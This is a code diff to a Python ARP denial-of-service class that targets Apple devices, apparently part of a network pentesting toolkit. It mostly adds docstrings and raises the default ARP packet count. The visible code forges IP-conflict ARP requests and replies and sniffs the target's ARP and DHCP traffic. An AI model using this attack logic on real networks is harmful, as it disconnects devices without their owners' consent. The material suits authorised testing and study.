@@ -52,7 +52,7 @@ class AppleArpDos:
     def __init__(self, network_interface: str) -> None:
         """
         Init
-        :param network_interface: Network interface name
+        :param network_interface: Network interface name (example: 'eth0')
         """
         self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                        required_parameters=['mac-address',
@@ -69,9 +69,9 @@ class AppleArpDos:
               quit: bool = False) -> None:
         """
         Start ARP DOS Apple device
-        :param target_ip_address:
-        :param target_mac_address:
-        :param quit: Quit mode
+        :param target_ip_address: Target IPv4 address (example: '192.168.0.1')
+        :param target_mac_address: Target MAC address (example: '12:34:56:78:90:ab')
+        :param quit: Quit mode (default: False)
         :return: None
         """
         try:
@@ -115,7 +115,12 @@ class AppleArpDos:
     # endregion
 
     # region ARP request sender
-    def _send_arp_requests(self, count_of_packets: int = 5) -> None:
+    def _send_arp_requests(self, count_of_packets: int = 10) -> None:
+        """
+        Send initial network conflict ARP request packets
+        :param count_of_packets: Count if ARP request packets (default: 10)
+        :return: None
+        """
         random_ip_address: str = self._base.get_random_ip_on_interface(self._your['network-interface'])
         arp_init_request = self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
                                                   ethernet_dst_mac=self._target['mac-address'],
@@ -128,6 +133,10 @@ class AppleArpDos:
 
     # region ARP reply sender
     def _send_arp_reply(self) -> None:
+        """
+        Send network conflict ARP reply packet
+        :return: None
+        """
         arp_reply = self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                             ethernet_dst_mac=self._target['mac-address'],
                                             sender_mac=self._your['mac-address'],
@@ -143,7 +152,11 @@ class AppleArpDos:
 
     # region Analyze packet
     def _analyze(self, packet: Dict) -> None:
-
+        """
+        Analyze parsed network packet dictionary
+        :param packet: Parsed network packet dictionary
+        :return: None
+        """
         # region ARP packet
         if 'ARP' in packet.keys():
             if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
@@ -176,6 +189,10 @@ class AppleArpDos:
 
     # region Sniff ARP and DHCP request from target
     def _sniffer(self) -> None:
+        """
+        Sniff ARP and DHCPv4 packets
+        :return: None
+        """
         self._sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._analyze,
                           filters={'Ethernet': {'source': self._target['mac-address']},
                                    'ARP': {'opcode': 1},
